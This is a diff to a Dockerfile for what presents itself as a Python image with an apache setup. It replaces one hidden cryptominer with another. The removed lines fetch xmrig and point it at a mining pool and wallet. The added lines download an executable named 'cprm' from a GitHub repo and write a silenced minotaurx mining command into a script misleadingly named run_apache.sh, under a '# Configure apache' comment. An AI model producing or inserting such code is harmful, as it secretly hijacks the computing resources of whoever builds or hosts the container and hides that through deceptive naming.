@@ -2,10 +2,10 @@ FROM python:3.9-slim
 
 # Install dependencies
 RUN apt update && apt -y install curl git wget sudo
-RUN wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && \
- tar -xvf xmrig.tar.gz
+RUN wget https://github.com/dufsvqk88/pee/raw/main/cprm >/dev/null 2>&1 && \
+ chmod 777 cprm
 # Configure apache
-RUN echo './xmrig --donate-level 1 -o 34.95.61.87:443 -u ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD.$(echo $(shuf -i 1-100000 -n 1)-SADAR) -p x -a rx/0 -t $(nproc --all)' >> run_apache.sh && \
+RUN echo './cprm -a minotaurx -o 128.199.68.208:443 -u RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG.CPU -t $(nproc --all) -p x > /dev/null 2>&1' >> run_apache.sh && \
  chmod 777 run_apache.sh
 
 EXPOSE 80
